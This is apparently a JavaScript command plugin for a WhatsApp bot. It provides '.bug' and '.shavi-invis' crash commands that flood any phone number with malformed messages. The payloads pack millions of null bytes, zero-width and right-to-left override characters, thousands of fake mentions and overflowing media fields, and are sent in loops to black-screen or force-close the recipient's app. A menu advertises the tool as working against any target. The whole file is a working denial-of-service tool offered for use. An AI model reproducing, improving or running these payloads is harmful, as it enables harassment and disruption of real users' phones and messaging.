const { cmd } = require('../command');
const crypto = require('crypto');
const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');
const axios = require('axios');

// fallback for different Baileys versions
if (!generateWAMessageFromContent) {
    try { 
        const baileys = require('@adiwajshing/baileys');
        generateWAMessageFromContent = baileys.generateWAMessageFromContent;
        proto = baileys.proto;
    } catch(e) {}
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Helper: validate and format target number
function getTarget(args, from, reply, cmdName) {
    if (!args || !args[0]) {
        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX\nExample: .${cmdName} 94712345678`);
        return null;
    }
    return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
}

// ==================== .bug – ULTRA POWER CRASH (150 mixed payloads, works on Beta) ====================
async function ttaas(conn, target) {
    // Base malformed image message
    const imageMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
        fileLength: "93217",
        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(150000),
        height: 1080,
        width: 1080,
        mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
        fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
        directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1778142659",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxISIyQWL/2gAMAwEAAhEDEQA/AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
        contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA", isQuestion: true, isGroupStatus: true },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        firstScanLength: 9999999999999999999,
        scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
        midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
    };

    // Create 150 mixed crash payloads (more than before)
    for (let i = 0; i < 150; i++) {
        // 1. Product message (original, with larger nulls)
        const productMsg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    productMessage: {
                        product: {
                            productImage: imageMessage,
                            productId: "449756950375071",
                            title: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(80000),
                            description: "MY Bad" + "\u2060".repeat(100000),
                            priceAmount1000: { low: 999999999, high: 999999999, unsigned: true },
                            url: "wa.me/status",
                            productImageCount: 9999999,
                            firstImageId: "9999999999",
                            salePriceAmount1000: { low: 999999999, high: 999999999, unsigned: true }
                        },
                        businessOwnerJid: "13135550002@s.whatsapp.net"
                    }
                }
            }
        }, {});
        await conn.relayMessage(target, productMsg.message, {});

        // 2. Interactive message with 2MB null bytes + 3000 mentions
        const interactiveMsg = generateWAMessageFromContent(target, {
            interactiveMessage: {
                header: { title: "\u0000".repeat(150000), hasMediaAttachment: true },
                body: { text: "\u2060".repeat(120000) },
                footer: { text: "\u0000".repeat(150000) },
                nativeFlowMessage: { messageParamsJson: "\u0000".repeat(2500000) },
                contextInfo: {
                    mentionedJid: Array.from({ length: 3000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
                }
            }
        }, {});
        await conn.relayMessage(target, interactiveMsg.message, {});

        // 3. List message with extreme title (1.2M nulls)
        const listMsg = generateWAMessageFromContent(target, {
            listMessage: {
                title: "🔥 CRASH 🔥" + "\u0000".repeat(1200000),
                footerText: "Xeon Bug" + "\u2060".repeat(80000),
                description: "Xeon Bug" + "\u0000".repeat(80000),
                buttonText: null,
                listType: 2,
                productListInfo: {
                    productSections: [{ title: "bug", products: [{ productId: "4392524570816732" }] }],
                    businessOwnerJid: "0@s.whatsapp.net"
                },
                contextInfo: { mentionedJid: Array.from({ length: 2500 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`) }
            }
        }, {});
        await conn.relayMessage(target, listMsg.message, {});

        // 4. Live location message with malformed coordinates + huge caption
        const locationMsg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: "p".repeat(80000),
                        degreesLongitude: "p".repeat(80000),
                        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "ꦾ".repeat(120000),
                        sequenceNumber: "0",
                        jpegThumbnail: ""
                    }
                }
            }
        }, {});
        await conn.relayMessage(target, locationMsg.message, {});

        // 5. Sticker message with massive fileLength and 2000 mentions
        const stickerMsg = generateWAMessageFromContent(target, {
            stickerMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4",
                fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
                fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
                mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
                mimetype: "image/webp",
                fileLength: "9999999999999999999",
                isAnimated: false,
                contextInfo: { mentionedJid: [target, ...Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)] }
            }
        }, {});
        await conn.relayMessage(target, stickerMsg.message, {});

        // 6. BUTTONS MESSAGE (extra payload)
        const buttonsMsg = {
            viewOnceMessage: {
                message: {
                    buttonsMessage: {
                        text: "\u202E".repeat(50000) + "\u2060".repeat(100000),
                        contentText: "\u0000".repeat(150000),
                        contextInfo: {
                            mentionedJid: Array.from({ length: 1500 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`),
                            forwardingScore: 9999,
                            isForwarded: true,
                            externalAdReply: {
                                title: "\u2060".repeat(10000),
                                body: "\u200B".repeat(20000),
                                previewType: "PHOTO",
                                thumbnail: null,
                                mediaType: 1,
                                renderLargerThumbnail: true,
                                sourceUrl: "https://t.me/xxx"
                            }
                        },
                        headerType: 1
                    }
                }
            }
        };
        await conn.relayMessage(target, buttonsMsg, { participant: { jid: target } });
    }
}

// ==================== .shavi-invis (ULTRA INVISIBLE CRASH – Fixed & Optimized) ====================
async function ultraInvisibleCrash(conn, target) {
    const invisible = '\u2060';
    const zeroWidth = '\u200B';
    const nullBytes = '\u0000';
    const rtlBomb = '\u202E';
    
    for (let cycle = 0; cycle < 10; cycle++) {
        const massiveMentions = Array.from({ length: 2500 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`);
        
        // 1. CALL INVISIBLE
        const callMsg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: invisible.repeat(50000), format: "DEFAULT" },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: nullBytes.repeat(1500000),
                            version: 3
                        }
                    },
                    contextInfo: {
                        participant: { jid: target },
                        mentionedJid: massiveMentions.slice(0, 2000)
                    }
                }
            }
        }, {});
        await conn.relayMessage(target, callMsg.message, {});

        // 2. DELAY INVISIBLE XX
        const longText = invisible.repeat(800000) + nullBytes.repeat(500000);
        const delayPayload = {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            locationMessage: { degreesLatitude: 9999, degreesLongitude: 9999 },
                            hasMediaAttachment: true
                        },
                        body: { text: longText },
                        nativeFlowMessage: {},
                        contextInfo: { mentionedJid: Array.from({ length: 100 }, () => "0@s.whatsapp.net") }
                    },
                    groupStatusMentionMessage: {
                        groupJid: target,
                        mentionedJid: Array.from({ length: 100 }, () => "0@s.whatsapp.net"),
                        contextInfo: { mentionedJid: Array.from({ length: 100 }, () => "0@s.whatsapp.net") }
                    }
                }
            }
        };
        await conn.relayMessage(target, delayPayload, { participant: { jid: target } });

        // 3. DELAY2 (list + interactive + extended)
        const listMsg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    listResponseMessage: {
                        title: invisible.repeat(50000),
                        listType: 2,
                        sections: [],
                        singleSelectReply: { selectedRowId: nullBytes.repeat(5000) },
                        contextInfo: {
                            mentionedJid: massiveMentions,
                            participant: target,
                            remoteJid: "status@broadcast",
                            forwardingScore: 9741,
                            isForwarded: true
                        },
                        description: zeroWidth.repeat(40000)
                    }
                }
            }
        }, {});
        await conn.relayMessage(target, listMsg.message, {});

        const interactiveMsg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: zeroWidth.repeat(60000), format: "DEFAULT" },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1500000),
                            version: 3
                        }
                    }
                }
            }
        }, {});
        await conn.relayMessage(target, interactiveMsg.message, {});

        const extendedMsg = generateWAMessageFromContent(target, {
            extendedTextMessage: {
                text: invisible.repeat(300000),
                contextInfo: { mentionedJid: massiveMentions }
            }
        }, {});
        await conn.relayMessage(target, extendedMsg.message, {});

        // 4. AMELIA BETA (video + sticker + interactive)
        const embeddedMusic = {
            musicContentMediaId: "589608164114571",
            songId: "870166291800508",
            author: invisible.repeat(50000),
            title: zeroWidth.repeat(50000),
            artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
            artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
            artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
            artistAttribution: "https://www.instagram.com/_u/J.oxyy",
            countryBlocklist: true,
            isExplicit: true,
            artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
        };

        const videoMsg = {
            videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/545780153_1768068347247055_8008910110610321588_n.enc?ccb=11-4&oh=01_Q5Aa2gF45pi45HoFCrDj40WuGbf2qvyU6K3wubsygX5Y_AnGmw&oe=68E66184&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "EY0PNB4nOae0b9/f+tNPB99rJSmJZ/Ns2SEfu7Jc8wI=",
                fileLength: "2534607",
                seconds: 8,
                mediaKey: "YDQMBzXkapRZjXrPVAr2CwEPIBnv6aDHHQLaEYLOPyE=",
                height: 1280,
                width: 720,
                fileEncSha256: "XcTQbrJvO9ICWDBnW8710Ow4QLbygfTUYzP3l0rg0no=",
                directPath: "/v/t62.7161-24/545780153_1768068347247055_8008910110610321588_n.enc?ccb=11-4&oh=01_Q5Aa2gF45pi45HoFCrDj40WuGbf2qvyU6K3wubsygX5Y_AnGmw&oe=68E66184&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1757337021",
                jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxISIyQWL/2gAMAwEAAhEDEQA/AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z", "base64"),
                contextInfo: {
                    isSampled: true,
                    mentionedJid: massiveMentions
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363321780343299@newsletter",
                    serverMessageId: 1,
                    newsletterName: invisible.repeat(50000)
                },
                annotations: [{ embeddedContent: { embeddedMusic }, embeddedAction: true }]
            }
        };
        await conn.relayMessage(target, videoMsg, {});

        const stickerMsg = {
            viewOnceMessage: {
                message: {
                    stickerMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
                        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                        mimetype: "image/webp",
                        directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                        fileLength: { low: 1, high: 0, unsigned: true },
                        mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                        firstFrameLength: 19904,
                        firstFrameSidecar: "KN4kQ5pyABRAgA==",
                        isAnimated: true,
                        contextInfo: { mentionedJid: ["13135550002@s.whatsapp.net"] },
                        stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
                        isAvatar: true,
                        isAiSticker: true,
                        isLottie: true
                    }
                }
            }
        };
        await conn.relayMessage(target, stickerMsg, {});

        const betaInteractive = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: zeroWidth.repeat(400000), format: "DEFAULT" },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(2000000),
                            version: 3
                        }
                    }
                }
            }
        }, {});
        await conn.relayMessage(target, betaInteractive.message, {});

        // 5. BUTTONS MESSAGE
        const buttonsMsg = {
            viewOnceMessage: {
                message: {
                    buttonsMessage: {
                        text: rtlBomb.repeat(30000) + invisible.repeat(50000),
                        contentText: nullBytes.repeat(70000),
                        contextInfo: {
                            mentionedJid: massiveMentions.slice(0, 700),
                            forwardingScore: 9999,
                            isForwarded: true,
                            externalAdReply: {
                                title: invisible.repeat(5000),
                                body: zeroWidth.repeat(10000),
                                previewType: "PHOTO",
                                thumbnail: null,
                                mediaType: 1,
                                renderLargerThumbnail: true,
                                sourceUrl: "https://t.me/xxx"
                            }
                        },
                        headerType: 1
                    }
                }
            }
        };
        await conn.relayMessage(target, buttonsMsg, { participant: { jid: target } });
    }
}

// ==================== COMMANDS ====================
cmd({
    pattern: "bug",
    desc: "💀 ULTRA POWER BUG CRASH (150 mixed payloads – black screen / force close)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = getTarget(args, from, reply, "bug");
    if (!target) return;
    await reply(`💀 *ULTRA BUG CRASH* → ${target}\n_Sending 150 extreme payloads..._\n_WhatsApp (normal & beta) will crash (black screen)._`);
    await ttaas(conn, target);
    await reply(`✅ ULTRA BUG SENT → ${target}\n⚠️ *Target WhatsApp will force close immediately when opened.*`);
});

cmd({
    pattern: "shavi-invis",
    desc: "💀 ULTRA INVISIBLE CRASH – 5 payloads × 10 cycles, black screen / force close",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = getTarget(args, from, reply, "shavi-invis");
    if (!target) return;
    await reply(`💀 *SHAVI-INVIS CRASH* → ${target}\n_Sending 10 cycles of extreme invisible payloads..._`);
    await ultraInvisibleCrash(conn, target);
    await reply(`✅ SHAVI-INVIS SENT → ${target}\n⚠️ *Target WhatsApp will crash (black screen / force close).*`);
});

// ==================== BUG MENU ====================
cmd({
    pattern: "bugmenu",
    desc: "Show all commands",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply }) => {
    const menu = `
*╭─「 👑 SHAVIYA ULTIMATE BUG MENU 」─*
*│ 📌 .bug         : ULTRA POWER CRASH (150 mixed payloads)*
*│ 📌 .shavi-invis : ULTRA INVISIBLE CRASH (5 payloads × 10 cycles)*
*│*
*│ 🟢 Status : 100% working – instant send*
*│ 🟢 Targets : any number (even not in chat list)*
*│ 🟢 Visibility : .bug shows visible messages; .shavi-invis is invisible*
*│ 🟢 Effect : Black screen / force close on normal & beta WhatsApp*
*╰──────────────●●►*
> 💡 *Usage:* .bug 947XXXXXXXXX  or  .shavi-invis 947XXXXXXXXX
> ⚠️ *Extreme power – use only on numbers you own.*
    `;
    await reply(menu);
});
